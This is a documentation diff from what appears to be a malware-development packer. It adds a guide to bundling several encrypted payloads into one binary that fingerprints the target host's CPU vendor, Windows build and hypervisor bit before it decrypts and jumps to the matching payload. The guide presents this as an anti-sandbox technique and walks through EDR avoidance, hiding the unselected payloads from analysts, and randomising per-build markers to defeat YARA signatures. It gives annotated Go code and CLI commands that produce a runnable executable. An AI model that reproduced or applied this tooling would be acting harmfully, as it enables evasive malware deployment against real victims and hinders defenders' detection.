@@ -372,6 +372,267 @@ Two dispatch paths exposed via `MALDEV_REFLECTIVE` env var:
 - Reflective load expects the payload to be a kernel-loadable
   static-PIE ELF — not raw shellcode (use Mode 5 for that).
 
+#### `BundlePayload` + `FingerprintPredicate` — full guide
+
+Both Modes 4 and 5 take a `[]packer.BundlePayload` as input. Each
+entry pairs a payload with the **rule** that decides whether THAT
+payload should fire on the current host. New operators commonly find
+this two-level structure confusing — this section walks through the
+why, the what, and every legal value.
+
+##### Why a bundle exists (operational need)
+
+You have a payload tuned for Windows 11 Intel and another for
+Windows 10 AMD. Without a bundle you would either:
+
+- ship two separate binaries and choose the right one out-of-band
+  (impossible without prior recon), or
+- ship the wrong one and crash / trip the EDR.
+
+A bundle is **one file** carrying N payloads + per-host dispatch
+logic. The wrapped binary boots, reads its own CPUID + Windows
+build, picks the matching payload, decrypts only that one, JMPs.
+The non-selected payloads stay encrypted on disk — analysts dumping
+the bundle without the per-payload XOR keys see noise at every
+non-active offset.
+
+Mental shape: **multi-stage rocket with a runtime selector**. You
+pre-load several stages; the binary picks one to ignite based on
+where it landed.
+
+##### `BundlePayload` — what it carries
+
+```go
+type BundlePayload struct {
+    Binary      []byte               // executable bytes (PE / ELF / shellcode, mode-dependent)
+    Fingerprint FingerprintPredicate // "what the host must look like for THIS payload to match"
+}
+```
+
+Just a pair `(payload, firing rule)`. Assemble N of them, hand to
+`PackBinaryBundle`.
+
+##### `FingerprintPredicate` — the matching rule
+
+```go
+type FingerprintPredicate struct {
+    PredicateType     uint8     // bitmask: which checks to enable
+    VendorString      [12]byte  // expected CPUID EAX=0 vendor bytes
+    BuildMin, BuildMax uint32   // Windows build-number range
+    CPUIDFeatureMask  uint32    // mask over CPUID[1].ECX
+    CPUIDFeatureValue uint32    // expected value under the mask
+    Negate            bool      // invert the overall match outcome
+}
+```
+
+##### `PredicateType` — the bitmask of active checks
+
+| Constant | Value | Activates |
+|---|---|---|
+| `PTCPUIDVendor` | `1 << 0` | `VendorString` against CPUID EAX=0 (12 bytes) |
+| `PTWinBuild` | `1 << 1` | `OSBuildNumber` against `[BuildMin, BuildMax]` |
+| `PTCPUIDFeatures` | `1 << 2` | `(CPUID[1].ECX & Mask) == Value` |
+| `PTMatchAll` | `1 << 3` | **wildcard** — matches any host |
+
+**Combination rules:**
+- Within ONE predicate: all enabled bits are **ANDed**. Every active
+  check must pass.
+- Across predicates: the **first matching entry wins**. Order matters
+  — put specific entries first, wildcards last.
+
+##### `VendorString` — the three real values
+
+Three exported `[12]byte` constants cover every consumer x86_64
+CPU shipped today:
+
+```go
+packer.VendorIntel  // "GenuineIntel"
+packer.VendorAMD    // "AuthenticAMD"
+packer.VendorHygon  // "HygonGenuine" — Chinese AMD-compatible CPUs
+```
+
+Read only when `PTCPUIDVendor` is set in `PredicateType`. Zero/empty
+value means "wildcard vendor" (any).
+
+##### `BuildMin` / `BuildMax` — Windows build cheat sheet
+
+The number returned by `RtlGetVersion().BuildNumber` (== PEB
+`OSBuildNumber`). Useful reference values:
+
+| Build | OS |
+|---|---|
+| 7600 | Windows 7 |
+| 9200 | Windows 8 |
+| 10240 | Windows 10 1507 |
+| 19041 | Windows 10 2004 |
+| 19045 | Windows 10 22H2 |
+| 22000 | Windows 11 21H2 |
+| 22631 | Windows 11 23H2 |
+| 26100 | Windows 11 24H2 |
+
+Range is **inclusive**. `0` on either side means "unbounded that side":
+
+- `BuildMin: 22000, BuildMax: 99999` → Windows 11+ only
+- `BuildMin: 10240, BuildMax: 19999` → Windows 10 only
+- `BuildMin: 0,     BuildMax: 9999`  → everything below Windows 10
+
+Read only when `PTWinBuild` is set.
+
+##### `CPUIDFeatureMask` / `Value` — fine-grained feature gating
+
+Useful bits in `CPUID[1].ECX`:
+
+| Bit | Feature |
+|---|---|
+| 0 | SSE3 |
+| 9 | SSSE3 |
+| 19 | SSE4.1 |
+| 20 | SSE4.2 |
+| 25 | AES-NI |
+| 28 | AVX |
+| 31 | Hypervisor present (1 = running in VM) |
+
+Operationally meaningful: bit 31 = anti-sandbox primitive. Setting
+`Mask = 1 << 31, Value = 0` means "fire only on physical hosts".
+
+Read only when `PTCPUIDFeatures` is set. `Mask = 0` skips the check
+even if the bit is enabled in `PredicateType`.
+
+##### `Negate` — invert the predicate
+
+Flips the overall match outcome. Lets operators write "everything
+EXCEPT X" rules without enumerating X. Currently honoured by the Mode 4
+launcher's host-side `SelectPayload` and the Go-runtime evaluator;
+the Mode 5 all-asm stub is queued for the same support — see
+[Limitations](#limitations).
+
+##### Runtime flow (what happens on the target)
+
+```
+[bundled binary boots on target]
+  ↓
+1. read CPUID EAX=0  → vendor 12 bytes
+2. read CPUID EAX=1  → ECX features
+3. read PEB.OSBuildNumber → Windows build
+  ↓
+4. for each FingerprintEntry in bundle:
+       result = AND(active checks)
+       if Negate: flip
+       if match: break
+  ↓
+5a. match found → XOR-decrypt that payload (16-byte per-payload key) → JMP entry
+5b. no match    → apply BundleFallbackBehaviour
+        Exit  → ExitProcess(0) silent
+        Crash → deliberate SIGSEGV (sandbox alert)
+        First → payload 0 unconditionally (dev / test only)
+```
+
+Other payloads stay ciphertext on disk. Without their per-payload XOR
+keys, an analyst dumping the bundle sees noise at every non-active
+offset.
+
+##### `BundleOptions` — bundle-level knobs
+
+```go
+type BundleOptions struct {
+    FallbackBehaviour BundleFallbackBehaviour // Exit / Crash / First — see above
+    FixedKey          []byte                  // tests only — reuses one XOR key across payloads
+    Profile           BundleProfile           // per-build IOC overrides; see Kerckhoffs section
+}
+```
+
+`Profile` carries the per-deployment magics derived from the operator's
+secret string via [`DeriveBundleProfile`](#per-build-ioc-randomisation--kerckhoffs).
+Production callers MUST set a fresh secret per ship to keep YARA
+signatures from clustering across deployments.
+
+##### Worked example — annotated
+
+```go
+intel := packer.VendorIntel
+amd   := packer.VendorAMD
+
+bundle, _ := packer.PackBinaryBundle([]packer.BundlePayload{
+    // [0] Windows 11 Intel — most specific, evaluated first.
+    {Binary: w11Payload, Fingerprint: packer.FingerprintPredicate{
+        PredicateType: packer.PTCPUIDVendor | packer.PTWinBuild,
+        VendorString:  intel,
+        BuildMin: 22000, BuildMax: 99999,
+    }},
+
+    // [1] Windows 10 AMD only.
+    {Binary: w10Payload, Fingerprint: packer.FingerprintPredicate{
+        PredicateType: packer.PTCPUIDVendor | packer.PTWinBuild,
+        VendorString:  amd,
+        BuildMin: 10240, BuildMax: 19999,
+    }},
+
+    // [2] Anti-sandbox — physical hosts only (hypervisor bit clear).
+    {Binary: physOnlyPayload, Fingerprint: packer.FingerprintPredicate{
+        PredicateType:     packer.PTCPUIDFeatures,
+        CPUIDFeatureMask:  1 << 31,  // hypervisor bit
+        CPUIDFeatureValue: 0,        // must be 0 = not in a VM
+    }},
+
+    // [3] Wildcard fallback — must come last (first-match wins).
+    {Binary: genericPayload, Fingerprint: packer.FingerprintPredicate{
+        PredicateType: packer.PTMatchAll,
+    }},
+}, packer.BundleOptions{
+    FallbackBehaviour: packer.BundleFallbackExit,
+    Profile:           packer.DeriveBundleProfile([]byte(secret)),
+})
+```
+
+How it dispatches:
+
+| Target | Result |
+|---|---|
+| Win11 Intel desktop | [0] fires |
+| Win10 AMD desktop | [1] fires |
+| Win10 Intel desktop | [0] / [1] fail vendor or build → [2] checks hypervisor bit; if physical → [2], else → [3] |
+| Win11 inside a VM | [0] passes vendor + build → [0] fires (the VM check is a per-payload opt-in, not bundle-wide) |
+| Win7 Intel | [0] / [1] fail build → [2] / [3] resolve as above |
+| anything exotic | [3] fires |
+
+##### CLI shorthand
+
+The `cmd/packer bundle` subcommand exposes a compact spec syntax for
+common cases:
+
+```bash
+packer bundle -out app.bundle \
+    -pl payload-w11.exe:intel:22000-99999 \
+    -pl payload-w10.exe:amd:10240-19999 \
+    -pl fallback.exe:*:*-* \
+    -fallback exit
+
+# Dry-run on the host — what would fire here?
+packer bundle -match app.bundle
+
+# Dump structure (defender-friendly)
+packer bundle -inspect app.bundle
+
+# Wrap into a runnable .exe via the launcher
+packer bundle -wrap launcher.exe -bundle app.bundle -out final.exe
+```
+
+Vendor `*` and build `*` decode to wildcards (`PTMatchAll` if both, or
+the per-bit equivalent for partial wildcards).
+
+##### Defensive lens (Kerckhoffs)
+
+The wire format is public — what stays operator-private is:
+
+- The `Profile` magics (BundleMagic, FooterMagic, ImageBase, etc.)
+  derived from a per-deployment secret string.
+- The 16-byte XOR keys baked per payload (random per pack).
+
+Two ships of the same payload set with different secrets produce two
+binaries with no shared YARA-able structural bytes. An analyst with
+the binary but not the secret can identify it as *a* maldev bundle
+but cannot mechanically align signatures across deployments.
+
 ### Mode 5 — `PackBinaryBundle` + all-asm wrap (tiny)
 
 Same bundle wire format as Mode 4, but the runtime is a hand-rolled
